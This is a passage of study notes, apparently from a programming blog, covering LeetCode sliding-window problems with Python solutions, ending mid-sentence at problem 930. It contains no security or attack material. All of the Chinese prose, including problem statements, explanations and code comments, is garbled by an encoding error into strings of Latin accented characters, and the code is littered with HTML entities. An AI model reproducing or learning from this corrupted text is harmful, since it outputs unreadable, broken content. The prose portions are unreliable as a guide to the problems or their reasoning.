[{"content":"LeetCodeåˆ·é¢˜:ä¸å®šé•¿æ»‘åŠ¨çª—å£ä¸“é¢˜ æ±‚æœ€é•¿/æœ€å¤§ 3.æ— é‡å¤å­—ç¬¦çš„æœ€é•¿å­ä¸² 3. æ— é‡å¤å­—ç¬¦çš„æœ€é•¿å­ä¸²\nç»™å®šä¸€ä¸ªå­—ç¬¦ä¸²sï¼Œè¯·ä½ æ‰¾å‡ºå…¶ä¸­ä¸å«æœ‰é‡å¤å­—ç¬¦çš„æœ€é•¿å­ä¸²çš„é•¿åº¦ã€‚\nç¤ºä¾‹ 1:\nè¾“å…¥: s = \u0026#34;abcabcbb\u0026#34; è¾“å‡º: 3 è§£é‡Š: å› ä¸ºæ— é‡å¤å­—ç¬¦çš„æœ€é•¿å­ä¸²æ˜¯ \u0026#34;abc\u0026#34;ï¼Œæ‰€ä»¥å…¶é•¿åº¦ä¸º 3ã€‚ æ€è·¯ï¼š\nä½¿ç”¨æ»‘åŠ¨çª—å£ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯çª—å£å·¦è¾¹å¾€å³ç¼©å°æ—¶æ˜¯ä¸ºäº†æ»¡è¶³é¢˜ç›®æ¡ä»¶ï¼Œä¸€æ—¦æ»¡è¶³æ¡ä»¶å°±åœæ­¢ï¼Œè€Œçª—å£å³è¾¹æ˜¯æ­£å¸¸çš„æ»‘åŠ¨ã€‚\nclass Solution: def lengthOfLongestSubstring(self, s: str) -\u0026gt; int: ans = 0 sets = set() left = 0 for i in range(len(s)): while s[i] in sets: sets.remove(s[left]) left += 1 sets.add(s[i]) ans = max(ans, len(sets)) return ans 3090.æ¯ä¸ªå­—ç¬¦æœ€å¤šå‡ºç°ä¸¤æ¬¡çš„æœ€é•¿å­å­—ç¬¦ä¸² ç»™ä½ ä¸€ä¸ªå­—ç¬¦ä¸²sï¼Œè¯·æ‰¾å‡ºæ»¡è¶³æ¯ä¸ªå­—ç¬¦æœ€å¤šå‡ºç°ä¸¤æ¬¡çš„æœ€é•¿å­å­—ç¬¦ä¸²ï¼Œå¹¶è¿”å›è¯¥å­å­—ç¬¦ä¸²çš„æœ€å¤§é•¿åº¦ã€‚\nç¤ºä¾‹ 1ï¼š\nè¾“å…¥ï¼š s = \u0026ldquo;bcbbbcba\u0026rdquo;\nè¾“å‡ºï¼š 4\nè§£é‡Šï¼š\nä»¥ä¸‹å­å­—ç¬¦ä¸²é•¿åº¦ä¸º 4ï¼Œå¹¶ä¸”æ¯ä¸ªå­—ç¬¦æœ€å¤šå‡ºç°ä¸¤æ¬¡ï¼š\u0026quot;bcbbbcba\u0026quot;ã€‚\næ€è·¯ï¼š\nå°±æ˜¯ä¸Šä¸€é¢˜çš„å‡çº§ç‰ˆ\nå®ç°:\nclass Solution: def maximumLengthSubstring(self, s: str) -\u0026gt; int: sets = defaultdict(int) ans = 0 left = 0 for i in range(len(s)): while sets[s[i]] \u0026gt;= 2: sets[s[left]] -= 1 left += 1 sets[s[i]] += 1 ans = max(ans, i - left + 1) return ans 2831.æ‰¾å‡ºæœ€é•¿ç­‰å€¼å­æ•°ç»„ï¼ˆæœªåšå‡ºï¼‰ 2831. æ‰¾å‡ºæœ€é•¿ç­‰å€¼å­æ•°ç»„\nç»™ä½ ä¸€ä¸ªä¸‹æ ‡ä» 0 å¼€å§‹çš„æ•´æ•°æ•°ç»„ nums å’Œä¸€ä¸ªæ•´æ•° k ã€‚\nå¦‚æœå­æ•°ç»„ä¸­æ‰€æœ‰å…ƒç´ éƒ½ç›¸ç­‰ï¼Œåˆ™è®¤ä¸ºå­æ•°ç»„æ˜¯ä¸€ä¸ª ç­‰å€¼å­æ•°ç»„ ã€‚æ³¨æ„ï¼Œç©ºæ•°ç»„æ˜¯ ç­‰å€¼å­æ•°ç»„ ã€‚\nä» nums ä¸­åˆ é™¤æœ€å¤š k ä¸ªå…ƒç´ åï¼Œè¿”å›å¯èƒ½çš„æœ€é•¿ç­‰å€¼å­æ•°ç»„çš„é•¿åº¦ã€‚\nå­æ•°ç»„ æ˜¯æ•°ç»„ä¸­ä¸€ä¸ªè¿ç»­ä¸”å¯èƒ½ä¸ºç©ºçš„å…ƒç´ åºåˆ—ã€‚\nç¤ºä¾‹ 1ï¼š\nè¾“å…¥ï¼šnums = [1,3,2,3,1,3], k = 3 è¾“å‡ºï¼š3 è§£é‡Šï¼šæœ€ä¼˜çš„æ–¹æ¡ˆæ˜¯åˆ é™¤ä¸‹æ ‡ 2 å’Œä¸‹æ ‡ 4 çš„å…ƒç´ ã€‚ åˆ é™¤åï¼Œnums ç­‰äº [1, 3, 3, 3] ã€‚ æœ€é•¿ç­‰å€¼å­æ•°ç»„ä» i = 1 å¼€å§‹åˆ° j = 3 ç»“æŸï¼Œé•¿åº¦ç­‰äº 3 ã€‚ å¯ä»¥è¯æ˜æ— æ³•åˆ›å»ºæ›´é•¿çš„ç­‰å€¼å­æ•°ç»„ã€‚ æ€è·¯ï¼š\nåˆ†ç»„+æ»‘åŠ¨çª—å£ï¼Œæ¯”å¦‚nums = [1,3,2,3,1,3]ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠ1ï¼Œ2ï¼Œ3åˆ†ä¸ºä¸‰ç»„ï¼Œç„¶åæ¯æ¬¡æŒ‰ç»„æ¥éå†ï¼Œçœ‹æ˜¯å¦èƒ½å°†å…¶ä»–å¤šä½™çš„å…ƒç´ åˆ é™¤ï¼Œå¦‚æœä¸è¶…è¿‡kåˆ™æ›´æ–°ç­‰å€¼å­æ•°ç»„çš„é•¿åº¦ã€‚(å‚è€ƒçµç¥)\nå®ç°ï¼š\nclass Solution: def longestEqualSubarray(self, nums: List[int], k: int) -\u0026gt; int: pos_lists = defaultdict(list) for i, x in enumerate(nums): pos_lists[x].append(i) ans = 0 for pos in pos_lists.values(): left = 0 for right, p in enumerate(pos): while p - pos[left] - (right - left) \u0026gt; k: left += 1 ans = max(ans,right - left + 1) return ans æ±‚æœ€çŸ­/æœ€å° 209.é•¿åº¦æœ€å°çš„å­æ•°ç»„ 209. é•¿åº¦æœ€å°çš„å­æ•°ç»„\nç»™å®šä¸€ä¸ªå«æœ‰nä¸ªæ­£æ•´æ•°çš„æ•°ç»„å’Œä¸€ä¸ªæ­£æ•´æ•°targetã€‚\næ‰¾å‡ºè¯¥æ•°ç»„ä¸­æ»¡è¶³å…¶æ€»å’Œå¤§äºç­‰äºtargetçš„é•¿åº¦æœ€å°çš„å­æ•°ç»„[numsl, numsl+1, ..., numsr-1, numsr]ï¼Œå¹¶è¿”å›å…¶é•¿åº¦**ã€‚**å¦‚æœä¸å­˜åœ¨ç¬¦åˆæ¡ä»¶çš„å­æ•°ç»„ï¼Œè¿”å›0ã€‚\næ€è·¯\nç›´æ¥ä½¿ç”¨æ»‘åŠ¨çª—å£ï¼Œæ¯å¾€å³æ‰©ä¸€æ¬¡ï¼Œå°±éœ€è¦æ£€æŸ¥æ˜¯å¦å¯ä»¥å°†å·¦ç«¯ç‚¹å¾€å³ç§»åŠ¨ä»¥æ‰¾åˆ°æ»¡è¶³é¢˜ç›®æ¡ä»¶çš„æœ€å­æ•°ç»„ã€‚\nå®ç°ï¼š\nclass Solution: def minSubArrayLen(self, target: int, nums: List[int]) -\u0026gt; int: left = 0 sum = 0 ans =len(nums) count = 0 for i in range(len(nums)): sum += nums[i] count += 1 while sum - nums[left] \u0026gt;= target: sum -= nums[left] left += 1 count -= 1 if sum \u0026gt;= target: ans = min(ans,count) if ans == len(nums) and target \u0026gt; sum: return 0 return ans 76.æœ€å°è¦†ç›–å­ä¸² 76. æœ€å°è¦†ç›–å­ä¸²\nç»™ä½ ä¸€ä¸ªå­—ç¬¦ä¸²sã€ä¸€ä¸ªå­—ç¬¦ä¸²tã€‚è¿”å›sä¸­æ¶µç›–tæ‰€æœ‰å­—ç¬¦çš„æœ€å°å­ä¸²ã€‚å¦‚æœsä¸­ä¸å­˜åœ¨æ¶µç›–tæ‰€æœ‰å­—ç¬¦çš„å­ä¸²ï¼Œåˆ™è¿”å›ç©ºå­—ç¬¦ä¸²\u0026quot;\u0026quot;ã€‚\næ³¨æ„ï¼š\nå¯¹äº t ä¸­é‡å¤å­—ç¬¦ï¼Œæˆ‘ä»¬å¯»æ‰¾çš„å­å­—ç¬¦ä¸²ä¸­è¯¥å­—ç¬¦æ•°é‡å¿…é¡»ä¸å°‘äº t ä¸­è¯¥å­—ç¬¦æ•°é‡ã€‚ å¦‚æœ s ä¸­å­˜åœ¨è¿™æ ·çš„å­ä¸²ï¼Œæˆ‘ä»¬ä¿è¯å®ƒæ˜¯å”¯ä¸€çš„ç­”æ¡ˆã€‚ ç¤ºä¾‹ 1ï¼š\nè¾“å…¥ï¼šs = \u0026#34;ADOBECODEBANC\u0026#34;, t = \u0026#34;ABC\u0026#34; è¾“å‡ºï¼š\u0026#34;BANC\u0026#34; è§£é‡Šï¼šæœ€å°è¦†ç›–å­ä¸² \u0026#34;BANC\u0026#34; åŒ…å«æ¥è‡ªå­—ç¬¦ä¸² t çš„ \u0026#39;A\u0026#39;ã€\u0026#39;B\u0026#39; å’Œ \u0026#39;C\u0026#39;ã€‚ æ€è·¯ï¼š\nå¯ä»¥å‚è€ƒ209é¢˜çš„åšæ³•ï¼Œæˆ‘ä»¬å…ˆæ»‘åŠ¨çª—å£å³ç§»ï¼Œå†ä»å·¦è¾¹ä¸æ–­ç¼©å°çª—å£ï¼Œæ‰¾åˆ°æœ€å°çš„å­ä¸²ï¼Œè¿™é¢˜æˆ‘ä»¬éœ€è¦æ³¨æ„çš„å°±æ˜¯å¦‚ä½•ä½¿ç”¨å“ˆå¸Œè¡¨åˆ¤æ–­å­ä¸²æ¶µç›–tçš„æ‰€æœ‰å­—ç¬¦ä¸²ã€‚\næ³¨æ„æˆ‘ä»¬åˆ¤æ–­å“ˆå¸Œè¡¨æ˜¯å¦æ¶µç›–å¯ä»¥ç›´æ¥ä½¿ç”¨cnt_s \u0026gt;= cnt_tã€‚\nclass Solution: def minWindow(self, s: str, t: str) -\u0026gt; str: def set_contain(t_cnt: set, s_cnt: set) -\u0026gt;bool: is_contain = True for x in t_cnt: if s_cnt[x] \u0026lt; t_cnt[x]: is_contain = False return is_contain t_cnt = Counter(t) s_cnt = Counter() left = 0 ans_left = -1 ans_right = len(s) for i, c in enumerate(s): s_cnt[c] += 1 while set_contain(t_cnt,s_cnt): if i - left \u0026lt; ans_right - ans_left: ans_left = left ans_right = i s_cnt[s[left]] -= 1 left += 1 return s[ans_left:ans_right+1] if ans_left != -1 else \u0026#34;\u0026#34; ä¼˜åŒ–ï¼š\nç”¨ä¸€ä¸ªå˜é‡ less ç»´æŠ¤ç›®å‰å­ä¸²ä¸­æœ‰ less ç§å­—æ¯çš„å‡ºç°æ¬¡æ•°å°äº t ä¸­å­—æ¯çš„å‡ºç°æ¬¡æ•°ã€‚\nclass Solution: def minWindow(self, s: str, t: str) -\u0026gt; str: ans_left, ans_right = -1, len(s) cnt = defaultdict(int) # æ¯” Counter æ›´å¿« for c in t: cnt[c] += 1 less = len(cnt) # æœ‰ less ç§å­—æ¯çš„å‡ºç°æ¬¡æ•° \u0026lt; t ä¸­çš„å­—æ¯å‡ºç°æ¬¡æ•° left = 0 for right, c in enumerate(s): # ç§»åŠ¨å­ä¸²å³ç«¯ç‚¹ cnt[c] -= 1 # å³ç«¯ç‚¹å­—æ¯ç§»å…¥å­ä¸² if cnt[c] == 0: # åŸæ¥çª—å£å†… c çš„å‡ºç°æ¬¡æ•°æ¯” t çš„å°‘ï¼Œç°åœ¨ä¸€æ ·å¤š less -= 1 while less == 0: # æ¶µç›–ï¼šæ‰€æœ‰å­—æ¯çš„å‡ºç°æ¬¡æ•°éƒ½æ˜¯ \u0026gt;= if right - left \u0026lt; ans_right - ans_left: # æ‰¾åˆ°æ›´çŸ­çš„å­ä¸² ans_left, ans_right = left, right # è®°å½•æ­¤æ—¶çš„å·¦å³ç«¯ç‚¹ x = s[left] # å·¦ç«¯ç‚¹å­—æ¯ if cnt[x] == 0: # x ç§»å‡ºçª—å£ä¹‹å‰ï¼Œæ£€æŸ¥å‡ºç°æ¬¡æ•°ï¼Œ # å¦‚æœçª—å£å†… x çš„å‡ºç°æ¬¡æ•°å’Œ t ä¸€æ ·ï¼Œ # é‚£ä¹ˆ x ç§»å‡ºçª—å£åï¼Œçª—å£å†… x çš„å‡ºç°æ¬¡æ•°æ¯” t çš„å°‘ less += 1 cnt[x] += 1 # å·¦ç«¯ç‚¹å­—æ¯ç§»å‡ºå­ä¸² left += 1 return \u0026#34;\u0026#34; if ans_left \u0026lt; 0 else s[ans_left: ans_right + 1] 2904.æœ€çŸ­ä¸”å­—å…¸åºæœ€å°çš„ç¾ä¸½å­å­—ç¬¦ä¸² 2904. æœ€çŸ­ä¸”å­—å…¸åºæœ€å°çš„ç¾ä¸½å­å­—ç¬¦ä¸²\nç»™ä½ ä¸€ä¸ªäºŒè¿›åˆ¶å­—ç¬¦ä¸²så’Œä¸€ä¸ªæ­£æ•´æ•°kã€‚\nå¦‚æœsçš„æŸä¸ªå­å­—ç¬¦ä¸²ä¸­1çš„ä¸ªæ•°æ°å¥½ç­‰äºkï¼Œåˆ™ç§°è¿™ä¸ªå­å­—ç¬¦ä¸²æ˜¯ä¸€ä¸ªç¾ä¸½å­å­—ç¬¦ä¸²ã€‚\nä»¤lenç­‰äºæœ€çŸ­ç¾ä¸½å­å­—ç¬¦ä¸²çš„é•¿åº¦ã€‚\nè¿”å›é•¿åº¦ç­‰äºlenä¸”å­—å…¸åºæœ€å° çš„ç¾ä¸½å­å­—ç¬¦ä¸²ã€‚å¦‚æœ s ä¸­ä¸å«ç¾ä¸½å­å­—ç¬¦ä¸²ï¼Œåˆ™è¿”å›ä¸€ä¸ª ç©º å­—ç¬¦ä¸²ã€‚\nå¯¹äºç›¸åŒé•¿åº¦çš„ä¸¤ä¸ªå­—ç¬¦ä¸²aå’Œbï¼Œå¦‚æœåœ¨aå’Œbå‡ºç°ä¸åŒçš„ç¬¬ä¸€ä¸ªä½ç½®ä¸Šï¼Œaä¸­è¯¥ä½ç½®ä¸Šçš„å­—ç¬¦ä¸¥æ ¼å¤§äºbä¸­çš„å¯¹åº”å­—ç¬¦ï¼Œåˆ™è®¤ä¸ºå­—ç¬¦ä¸²aå­—å…¸åºå¤§äºå­—ç¬¦ä¸²bã€‚\nä¾‹å¦‚ï¼Œ\u0026quot;abcd\u0026quot;çš„å­—å…¸åºå¤§äº\u0026quot;abcc\u0026quot;ï¼Œå› ä¸ºä¸¤ä¸ªå­—ç¬¦ä¸²å‡ºç°ä¸åŒçš„ç¬¬ä¸€ä¸ªä½ç½®å¯¹åº”ç¬¬å››ä¸ªå­—ç¬¦ï¼Œè€Œdå¤§äºcã€‚ ç¤ºä¾‹ 1ï¼š\nè¾“å…¥ï¼šs = \u0026#34;100011001\u0026#34;, k = 3 è¾“å‡ºï¼š\u0026#34;11001\u0026#34; è§£é‡Šï¼šç¤ºä¾‹ä¸­å…±æœ‰ 7 ä¸ªç¾ä¸½å­å­—ç¬¦ä¸²ï¼š 1. å­å­—ç¬¦ä¸² \u0026#34;100011001\u0026#34; ã€‚ 2. å­å­—ç¬¦ä¸² \u0026#34;100011001\u0026#34; ã€‚ 3. å­å­—ç¬¦ä¸² \u0026#34;100011001\u0026#34; ã€‚ 4. å­å­—ç¬¦ä¸² \u0026#34;100011001\u0026#34; ã€‚ 5. å­å­—ç¬¦ä¸² \u0026#34;100011001\u0026#34; ã€‚ 6. å­å­—ç¬¦ä¸² \u0026#34;100011001\u0026#34; ã€‚ 7. å­å­—ç¬¦ä¸² \u0026#34;100011001\u0026#34; ã€‚ æœ€çŸ­ç¾ä¸½å­å­—ç¬¦ä¸²çš„é•¿åº¦æ˜¯ 5 ã€‚ é•¿åº¦ä¸º 5 ä¸”å­—å…¸åºæœ€å°çš„ç¾ä¸½å­å­—ç¬¦ä¸²æ˜¯å­å­—ç¬¦ä¸² \u0026#34;11001\u0026#34; ã€‚ æ€è·¯ï¼š\nç»´æŠ¤ä¸€ä¸ªæ»‘åŠ¨çª—å£ï¼Œç„¶åä¸æ–­æ”¶ç¼©æ‰¾åˆ°æœ€çŸ­ç¾ä¸½å­—ç¬¦ä¸²ï¼Œéœ€è¦æ³¨æ„å­—å…¸åºæœ€å°çš„ç­”æ¡ˆï¼Œç›´æ¥ç”¨æ¯”è¾ƒæ³•å°±å¥½äº†ã€‚\nå®ç°ï¼š\nclass Solution: def shortestBeautifulSubstring(self, s: str, k: int) -\u0026gt; str: if s.count(\u0026#39;1\u0026#39;) \u0026lt; k: return \u0026#34;\u0026#34; ans = s left = 0 cnt_1 = 0 ss = \u0026#34;\u0026#34; for right, x in enumerate(s): cnt_1 += int(x) while cnt_1 - int(s[left]) \u0026gt;= k: cnt_1 -= int(s[left]) left += 1 if cnt_1 == k: ss = s[left:right + 1] if len(ss) \u0026lt; len(ans) or ss \u0026lt; ans and len(ss) == len(ans): ans = ss return ans æ±‚å­æ•°ç»„ä¸ªæ•° ä¸€èˆ¬è¦å†™ ans += leftã€‚\næ»‘åŠ¨çª—å£çš„å†…å±‚å¾ªç¯ç»“æŸæ—¶ï¼Œå³ç«¯ç‚¹å›ºå®šåœ¨ rightï¼Œå·¦ç«¯ç‚¹åœ¨ 0,1,2,â€¦,leftâˆ’1 çš„æ‰€æœ‰å­æ•°ç»„ï¼ˆå­ä¸²ï¼‰éƒ½æ˜¯åˆæ³•çš„ï¼Œè¿™ä¸€å…±æœ‰ left ä¸ªã€‚\n1358.åŒ…å«æ‰€æœ‰ä¸‰ç§å­—ç¬¦çš„å­å­—ç¬¦ä¸²æ•°ç›® 1358.åŒ…å«æ‰€æœ‰ä¸‰ç§å­—ç¬¦çš„å­å­—ç¬¦ä¸²æ•°ç›®\nç»™ä½ ä¸€ä¸ªå­—ç¬¦ä¸²sï¼Œå®ƒåªåŒ…å«ä¸‰ç§å­—ç¬¦a,bå’Œcã€‚\nè¯·ä½ è¿”å›aï¼Œbå’Œcéƒ½è‡³å°‘å‡ºç°è¿‡ä¸€æ¬¡çš„å­å­—ç¬¦ä¸²æ•°ç›®ã€‚\nç¤ºä¾‹ 1ï¼š\nè¾“å…¥ï¼šs = \u0026#34;abcabc\u0026#34; è¾“å‡ºï¼š10 è§£é‡Šï¼šåŒ…å« aï¼Œb å’Œ c å„è‡³å°‘ä¸€æ¬¡çš„å­å­—ç¬¦ä¸²ä¸º \u0026#34;abc\u0026#34;, \u0026#34;abca\u0026#34;, \u0026#34;abcab\u0026#34;, \u0026#34;abcabc\u0026#34;, \u0026#34;bca\u0026#34;, \u0026#34;bcab\u0026#34;, \u0026#34;bcabc\u0026#34;, \u0026#34;cab\u0026#34;, \u0026#34;cabc\u0026#34; å’Œ \u0026#34;abc\u0026#34; (ç›¸åŒå­—ç¬¦ä¸²ç®—å¤šæ¬¡)ã€‚ æ€è·¯ï¼š\nåˆ©ç”¨å“ˆå¸Œè¡¨å­˜å‚¨a,b,cçš„ä¸ªæ•°ï¼Œç„¶åæ„å»ºæ»‘åŠ¨çª—å£ï¼Œå¦‚æœæ»¡è¶³æ¡ä»¶å°±ç§»åŠ¨å·¦ç«¯ç‚¹ï¼Œç›´åˆ°ä¸æ»¡è¶³æ¡ä»¶ï¼Œæ­¤æ—¶ans += leftï¼Œleftå°±æ˜¯ä»¥rightä¸ºå³ç«¯ç‚¹çš„å­ä¸²æ•°ã€‚\nå®ç°ï¼š\nfrom collections import Counter class Solution: def numberOfSubstrings(self, s: str) -\u0026gt; int: ans = 0 left = 0 n = len(s) cnt_s = Counter(\u0026#34;abc\u0026#34;) cnt_t = Counter() for right, p in enumerate(s): cnt_t[p] += 1 while cnt_t \u0026gt;= cnt_s: cnt_t[s[left]] -= 1 left += 1 ans += left return ans if __name__ == \u0026#34;__main__\u0026#34;: s = \u0026#34;acbbcac\u0026#34; solution = Solution() print(solution.numberOfSubstrings(s)) 2537.ç»Ÿè®¡å¥½å­æ•°ç»„çš„æ•°ç›® 2537. ç»Ÿè®¡å¥½å­æ•°ç»„çš„æ•°ç›®\nç»™ä½ ä¸€ä¸ªæ•´æ•°æ•°ç»„ nums å’Œä¸€ä¸ªæ•´æ•° k ï¼Œè¯·ä½ è¿”å› nums ä¸­ å¥½ å­æ•°ç»„çš„æ•°ç›®ã€‚\nä¸€ä¸ªå­æ•°ç»„ arr å¦‚æœæœ‰ è‡³å°‘ k å¯¹ä¸‹æ ‡ (i, j) æ»¡è¶³ i \u0026lt; j ä¸” arr[i] == arr[j] ï¼Œé‚£ä¹ˆç§°å®ƒæ˜¯ä¸€ä¸ª å¥½ å­æ•°ç»„ã€‚\nå­æ•°ç»„ æ˜¯åŸæ•°ç»„ä¸­ä¸€æ®µè¿ç»­ éç©º çš„å…ƒç´ åºåˆ—ã€‚\nç¤ºä¾‹ 1ï¼š\nè¾“å…¥ï¼šnums = [1,1,1,1,1], k = 10 è¾“å‡ºï¼š1 è§£é‡Šï¼šå”¯ä¸€çš„å¥½å­æ•°ç»„æ˜¯è¿™ä¸ªæ•°ç»„æœ¬èº«ã€‚ æ€è·¯ï¼š\nå»¶ç»­ä¸Šä¸€é¢˜çš„æ€è·¯ï¼Œé‡ç‚¹åœ¨äºå¦‚ä½•åˆ¤æ–­æ•°ç»„æ˜¯å¥½æ•°ç»„ã€‚\nå®ç°ï¼š\nclass Solution: def countGood(self, nums: List[int], k: int) -\u0026gt; int: cnt_g = Counter() ans = 0 left = 0 pairs = 0 for right, p in enumerate(nums): pairs += cnt_g[p] cnt_g[p] += 1 while pairs \u0026gt;= k: pairs -= cnt_g[nums[left]] - 1 cnt_g[nums[left]] -= 1 left += 1 ans += left return ans è¶ŠçŸ­è¶Šåˆæ³• ä¸€èˆ¬è¦å†™ ans += right - left + 1ã€‚\næ»‘åŠ¨çª—å£çš„å†…å±‚å¾ªç¯ç»“æŸæ—¶ï¼Œå³ç«¯ç‚¹å›ºå®šåœ¨rightï¼Œå·¦ç«¯ç‚¹åœ¨left,left+1,â€¦,rightçš„æ‰€æœ‰å­æ•°ç»„ï¼ˆå­ä¸²ï¼‰éƒ½æ˜¯åˆæ³•çš„ï¼Œè¿™ä¸€å…±æœ‰rightâˆ’left+1 ä¸ªã€‚\n713.ä¹˜ç§¯å°äº K çš„å­æ•°ç»„ 713. ä¹˜ç§¯å°äº K çš„å­æ•°ç»„\nç»™ä½ ä¸€ä¸ªæ•´æ•°æ•°ç»„ nums å’Œä¸€ä¸ªæ•´æ•° k ï¼Œè¯·ä½ è¿”å›å­æ•°ç»„å†…æ‰€æœ‰å…ƒç´ çš„ä¹˜ç§¯ä¸¥æ ¼å°äº k çš„è¿ç»­å­æ•°ç»„çš„æ•°ç›®ã€‚\nç¤ºä¾‹ 1ï¼š\nè¾“å…¥ï¼šnums = [10,5,2,6], k = 100 è¾“å‡ºï¼š8 è§£é‡Šï¼š8 ä¸ªä¹˜ç§¯å°äº 100 çš„å­æ•°ç»„åˆ†åˆ«ä¸ºï¼š[10]ã€[5]ã€[2]ã€[6]ã€[10,5]ã€[5,2]ã€[2,6]ã€[5,2,6]ã€‚ éœ€è¦æ³¨æ„çš„æ˜¯ [10,5,2] å¹¶ä¸æ˜¯ä¹˜ç§¯å°äº 100 çš„å­æ•°ç»„ã€‚ å®ç°ï¼š\nclass Solution: def numSubarrayProductLessThanK(self, nums: List[int], k: int) -\u0026gt; int: ans = left = 0 s = 1 for right, p in enumerate(nums): s *= p while s \u0026gt;= k and left \u0026lt;= right: s /= nums[ left] left += 1 ans += right - left + 1 return ans 2762.ä¸é—´æ–­å­æ•°ç»„ 2762.ä¸é—´æ–­å­æ•°ç»„\nç»™ä½ ä¸€ä¸ªä¸‹æ ‡ä»0å¼€å§‹çš„æ•´æ•°æ•°ç»„numsã€‚numsçš„ä¸€ä¸ªå­æ•°ç»„å¦‚æœæ»¡è¶³ä»¥ä¸‹æ¡ä»¶ï¼Œé‚£ä¹ˆå®ƒæ˜¯ä¸é—´æ–­çš„ï¼š\niï¼Œi+1ï¼Œ\u0026hellip;ï¼Œjè¡¨ç¤ºå­æ•°ç»„ä¸­çš„ä¸‹æ ‡ã€‚å¯¹äºæ‰€æœ‰æ»¡è¶³i\u0026lt;=i1,i2\u0026lt;=jçš„ä¸‹æ ‡å¯¹ï¼Œéƒ½æœ‰0\u0026lt;=|nums[i1]-nums[i2]|\u0026lt;=2ã€‚ è¯·ä½ è¿”å›ä¸é—´æ–­å­æ•°ç»„çš„æ€»æ•°ç›®ã€‚\nå­æ•°ç»„æ˜¯ä¸€ä¸ªæ•°ç»„ä¸­ä¸€æ®µè¿ç»­éç©ºçš„å…ƒç´ åºåˆ—ã€‚\nç¤ºä¾‹ 1ï¼š\nè¾“å…¥ï¼šnums = [5,4,2,4] è¾“å‡ºï¼š8 è§£é‡Šï¼š å¤§å°ä¸º 1 çš„ä¸é—´æ–­å­æ•°ç»„ï¼š[5], [4], [2], [4] ã€‚ å¤§å°ä¸º 2 çš„ä¸é—´æ–­å­æ•°ç»„ï¼š[5,4], [4,2], [2,4] ã€‚ å¤§å°ä¸º 3 çš„ä¸é—´æ–­å­æ•°ç»„ï¼š[4,2,4] ã€‚ æ²¡æœ‰å¤§å°ä¸º 4 çš„ä¸é—´æ–­å­æ•°ç»„ã€‚ ä¸é—´æ–­å­æ•°ç»„çš„æ€»æ•°ç›®ä¸º 4 + 3 + 1 = 8 ã€‚ é™¤äº†è¿™äº›ä»¥å¤–ï¼Œæ²¡æœ‰åˆ«çš„ä¸é—´æ–­å­æ•°ç»„ã€‚ æ€è·¯ï¼š\næ»‘åŠ¨çª—å£ï¼Œéœ€è¦æ³¨æ„çš„å°±æ˜¯å¦‚ä½•å­˜å‚¨å’Œè·å–çª—å£æ•°ç»„çš„æœ€å¤§æœ€å°å€¼ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å“ˆå¸Œè¡¨æ¥å®ç°ï¼Œå› ä¸ºæœ€å¤šåªæ¶‰åŠåˆ°3ä¸ªæ•°ï¼Œè€Œä¸”å¯ä»¥ç›´æ¥ä½¿ç”¨maxå’Œminå‡½æ•°è·å–æœ€å¤§æœ€å°å€¼ã€‚\nå®ç°ï¼š\nclass Solution: def continuousSubarrays(self, nums: List[int]) -\u0026gt; int: ans = left = 0 sets = Counter() for right, p in enumerate(nums): sets[p] += 1 while max(sets) - min(sets) \u0026gt; 2: sets[nums[left]] -= 1 if sets[nums[left]] == 0: del sets[nums[left]] left += 1 ans += right - left + 1 return ans æ°å¥½å‹æ»‘åŠ¨çª—å£ ä¾‹å¦‚ï¼Œè¦è®¡ç®—æœ‰å¤šå°‘ä¸ªå…ƒç´ å’Œæ°å¥½ç­‰äºğ‘˜çš„å­æ•°ç»„ï¼Œå¯ä»¥æŠŠé—®é¢˜å˜æˆï¼š\nè®¡ç®—æœ‰å¤šå°‘ä¸ªå…ƒç´ å’Œâ‰¥ğ‘˜çš„å­æ•°ç»„ã€‚ è®¡ç®—æœ‰å¤šå°‘ä¸ªå…ƒç´ å’Œğ‘˜ï¼Œä¹Ÿå°±æ˜¯ â‰¥ğ‘˜+1 çš„å­æ•°ç»„ã€‚ ç­”æ¡ˆå°±æ˜¯å…ƒç´ å’Œâ‰¥ğ‘˜çš„å­æ•°ç»„ä¸ªæ•°ï¼Œå‡å»å…ƒç´ å’Œâ‰¥ğ‘˜+1çš„å­æ•°ç»„ä¸ªæ•°ã€‚è¿™é‡ŒæŠŠ\u0026gt;è½¬æ¢æˆâ‰¥ï¼Œä»è€Œå¯ä»¥æŠŠæ»‘çª—é€»è¾‘å°è£…æˆä¸€ä¸ªå‡½æ•°fï¼Œç„¶åç”¨ f(k) - f(k + 1) è®¡ç®—ï¼Œæ— éœ€ç¼–å†™ä¸¤ä»½æ»‘çª—ä»£ç ã€‚\næ€»ç»“ï¼šã€Œæ°å¥½ã€å¯ä»¥æ‹†åˆ†æˆä¸¤ä¸ªã€Œè‡³å°‘ã€ï¼Œä¹Ÿå°±æ˜¯ä¸¤ä¸ªã€Œè¶Šé•¿è¶Šåˆæ³•ã€çš„æ»‘çª—é—®é¢˜ã€‚\næ³¨ï¼šä¹Ÿå¯ä»¥æŠŠé—®é¢˜å˜æˆâ‰¤kå‡å»â‰¤kâˆ’1ï¼ˆä¸¤ä¸ªè‡³å¤šï¼‰ã€‚å¯æ ¹æ®é¢˜ç›®é€‰æ‹©åˆé€‚çš„å˜å½¢æ–¹å¼ã€‚\næ³¨ï¼šä¹Ÿå¯ä»¥æŠŠä¸¤ä¸ªæ»‘åŠ¨çª—å£åˆå¹¶èµ·æ¥ï¼Œç»´æŠ¤åŒä¸€ä¸ªå³ç«¯ç‚¹ right å’Œä¸¤ä¸ªå·¦ç«¯ç‚¹ left1å’Œ left2ï¼Œæˆ‘æŠŠè¿™ç§å†™æ³•å«åšä¸‰æŒ‡é’ˆæ»‘åŠ¨çª—å£ã€‚\n930.å’Œç›¸åŒçš„äºŒå…ƒå­æ•°ç»„ 930. å’Œç›¸åŒçš„äºŒå…ƒå­æ•°ç»„\nç»™ä½ ä¸€ä¸ªäºŒå…ƒæ•°ç»„numsï¼Œå’Œä¸€ä¸ªæ•´æ•°goalï¼Œè¯·ä½ ç»Ÿè®¡å¹¶è¿”å›æœ‰å¤šå°‘ä¸ªå’Œä¸ºgoalçš„éç©ºå­æ•°ç»„ã€‚\nå­æ•°ç»„æ˜¯æ•°ç»„çš„ä¸€æ®µè¿ç»­éƒ¨åˆ†ã€‚\nç¤ºä¾‹ 1ï¼š\nè¾“å…¥ï¼šnums = [1,0,1,0,1], goal = 2 è¾“å‡ºï¼š4 è§£é‡Šï¼š æœ‰ 4 